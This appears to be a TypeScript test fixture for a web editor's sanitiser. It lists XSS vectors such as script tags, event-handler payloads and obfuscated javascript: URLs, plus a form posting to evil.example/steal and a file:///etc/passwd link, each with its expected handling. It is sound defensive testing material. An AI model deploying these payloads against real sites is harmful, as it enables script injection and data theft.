/**
 * The one corpus of hostile input for the web client (contracts section 8): every test that renders, pastes, imports or links imports it from here;
 * none keeps a private copy. An entry is Markdown (`markdown`), pasted HTML (`html`) or an address (`href`), with what must happen to it (`expect`).
 */
export type Expectation =
  /** An address a link may carry. */
  | 'link-kept'
  /** An address a link must not carry: the link's text stays, the link goes. */
  | 'link-refused'
  /** Raw HTML in Markdown: shown as inert text; no script runs, no global is set, no request is made. */
  | 'inert'
  /** Pasted HTML: active content (script, frames, forms, styles, event handlers) is gone, the text stays. */
  | 'sanitised'
  /** An image that is not an uploaded one (a web address, a network-path address, a relative path, a `data:` address): never loaded, no request for it; shown as "External image not loaded: <host or path>", and a `data:` one as its alt text. */
  | 'image-blocked'
  /** An uploaded image (`attachments/<uuid>/<name>`): shown through a signed link, so a test of it must answer the application's request for links. */
  | 'image-kept'
  /** Large or deeply nested input: handled within the limits, without hanging the page. */
  | 'bounded';

/** The id of the uploaded file of the corpus: the test-e2e attachment specs answer for this one (`ID` of test-e2e/attachments/support.ts is the same value). */
export const UPLOADED_ID = '3f2a9c1e-8b7d-4e6f-9a1b-2c3d4e5f6a7b';

export interface XssEntry {
  readonly id: string;
  readonly markdown?: string;
  readonly html?: string;
  readonly href?: string;
  readonly expect: Expectation;
}

/** `- a` lines nested one level deeper each time, then flat, to at least `bytes` characters. */
export function nestedLists(bytes: number): string {
  const lines: string[] = [];
  let size = 0;
  for (let i = 0; size < bytes; i++) {
    const line = `${'  '.repeat(i % 40)}- item ${i}`;
    lines.push(line);
    size += line.length + 1;
  }
  return lines.join('\n');
}

/**
 * The Markdown of a link to `value`, or undefined when no CommonMark link can hold that address. A bare destination has no space or control character and
 * does not start with `<`; the angle-bracket form takes those but no line ending and no `<` or `>`. An entry whose address cannot be a Markdown destination keeps its `href` only,
 * so a rendering test never "passes" on text that was never a link.
 */
export function markdownLink(value: string): string | undefined {
  if (!/[\u0000-\u0020\u007f]/.test(value) && !value.startsWith('<')) return `[link](${value})`;
  if (!/[\r\n<>]/.test(value)) return `[link](<${value}>)`;
  return undefined;
}

const href = (id: string, value: string, expect: 'link-kept' | 'link-refused'): XssEntry => {
  const markdown = markdownLink(value);
  return markdown === undefined ? { id, href: value, expect } : { id, href: value, markdown, expect };
};
const html = (id: string, value: string, expect: Expectation = 'sanitised'): XssEntry => ({ id, html: value, expect });
const markdown = (id: string, value: string, expect: Expectation = 'inert'): XssEntry => ({ id, markdown: value, expect });

export const xssCorpus: readonly XssEntry[] = [
  // Pasted HTML: script and event handlers
  html('html-script-tag', '<p>hello</p><script>alert(1)</script>'),
  html('html-img-onerror', '<img src=x onerror=alert(1)>'),
  html('html-svg-onload', '<svg onload=alert(1)><circle r=1></circle></svg>'),
  html('html-body-onload', '<body onload=alert(1)>text</body>'),
  html('html-anchor-onclick', '<a href="/p/x" onclick="alert(1)">go</a>'),
  html('html-input-autofocus', '<input autofocus onfocus=alert(1)>'),
  html('html-details-ontoggle', '<details open ontoggle=alert(1)>x</details>'),
  html('html-video-onerror', '<video><source onerror=alert(1)></video>'),
  html('html-style-attribute', '<p style="background:url(https://evil.example/t.gif)">styled</p>'),
  html('html-meta-refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example">text'),
  html('html-object-embed', '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/x.swf">'),
  html('html-base-href', '<base href="https://evil.example/"><a href="x">x</a>'),
  html('html-link-import', '<link rel="stylesheet" href="https://evil.example/x.css">text'),
  html('html-template-script', '<template><script>alert(1)</script></template>'),
  html('html-math-mtext', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'),
  html('html-svg-xlink', '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'),
  html('html-anchor-javascript', '<a href="javascript:alert(1)">click</a>', 'sanitised'),
  // Frames, forms and styles
  html('html-iframe-src', '<iframe src="https://evil.example/"></iframe>'),
  html('html-iframe-javascript', '<iframe src="javascript:alert(1)"></iframe>'),
  html('html-iframe-srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'),
  html('html-form-action', '<form action="https://evil.example/steal"><input name="q"><button>go</button></form>'),
  html('html-form-formaction', '<form><button formaction="javascript:alert(1)">go</button></form>'),
  html('html-style-element', '<style>@import url(https://evil.example/x.css); body { display: none }</style><p>text</p>'),
  html('html-style-in-body', '<p>text</p><style>p { color: red }</style>'),
  // Images in pasted HTML
  html('html-image-remote', '<img src="https://evil.example/pixel.gif" alt="remote">', 'image-blocked'),
  // Markdown: raw HTML stays inert text
  markdown('md-raw-script', '<script>alert(1)</script>'),
  markdown('md-raw-img-onerror', '<img src=x onerror=alert(1)>'),
  markdown('md-raw-iframe', '<iframe src="https://evil.example/"></iframe>'),
  markdown('md-raw-comment-script', '<!-- <script>alert(1)</script> -->'),
  markdown('md-raw-style', '<style>body { display: none }</style>'),
  markdown('md-autolink-javascript', '<javascript:alert(1)>', 'inert'),
  // Markdown images
  markdown('md-image-remote', '![remote](https://evil.example/x.png)', 'image-blocked'),
  markdown('md-image-data', '![data](data:image/png;base64,iVBORw0KGgo=)', 'image-blocked'),
  markdown('md-image-protocol-relative', '![p](//evil.example/x.png)', 'image-blocked'),
  markdown('md-image-relative', '![local](./files/a.png)', 'image-blocked'),
  markdown('md-image-attachment', `![uploaded](attachments/${UPLOADED_ID}/a.png)`, 'image-kept'),
  // Link addresses that must be refused: every spelling of the unsafe schemes
  href('href-javascript', 'javascript:alert(1)', 'link-refused'),
  href('href-javascript-mixed-case', 'JaVaScRiPt:alert(1)', 'link-refused'),
  href('href-javascript-tab', 'java\tscript:alert(1)', 'link-refused'),
  href('href-javascript-newline', 'java\nscript:alert(1)', 'link-refused'),
  href('href-javascript-leading-control', '\u0001javascript:alert(1)', 'link-refused'),
  href('href-javascript-leading-space', ' javascript:alert(1)', 'link-refused'),
  href('href-javascript-invisible', '\u200bjavascript:alert(1)', 'link-refused'),
  href('href-javascript-entity-decimal', '&#106;avascript:alert(1)', 'link-refused'),
  href('href-javascript-entity-hex-tab', 'jav&#x09;ascript:alert(1)', 'link-refused'),
  href('href-javascript-entity-colon', 'javascript&colon;alert(1)', 'link-refused'),
  href('href-javascript-percent-letter', '%6Aavascript:alert(1)', 'link-refused'),
  href('href-javascript-percent-colon', 'javascript%3Aalert(1)', 'link-refused'),
  href('href-file', 'file:///etc/passwd', 'link-refused'),
  href('href-vbscript', 'vbscript:msgbox(1)', 'link-refused'),
  href('href-data-html', 'data:text/html,<script>alert(1)</script>', 'link-refused'),
  href('href-data-base64', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', 'link-refused'),
  href('href-blob', 'blob:https://app.example/0b9a7c1e-1111-4222-8333-444455556666', 'link-refused'),
  href('href-about', 'about:blank', 'link-refused'),
  href('href-view-source', 'view-source:https://example.com/', 'link-refused'),
  href('href-unknown-scheme', 'x-unknown:payload', 'link-refused'),
  // Link addresses that are fine: the allow-list of the editor schema (hand-over schemes included)
  href('href-http', 'http://example.com/a', 'link-kept'),
  href('href-https', 'https://example.com/?q=1#top', 'link-kept'),
  href('href-mailto', 'mailto:someone@example.com', 'link-kept'),
  href('href-ftp', 'ftp://files.example.com/a.txt', 'link-kept'),
  href('href-tel', 'tel:+15550100', 'link-kept'),
  href('href-relative-root', '/p/some-page-ab12cd', 'link-kept'),
  href('href-relative-dot', './sibling', 'link-kept'),
  href('href-relative-up', '../parent', 'link-kept'),
  href('href-fragment', '#section', 'link-kept'),
  href('href-query', '?q=1', 'link-kept'),
  // Size
  { id: 'nested-lists-1mb', markdown: nestedLists(1_000_000), expect: 'bounded' },
];
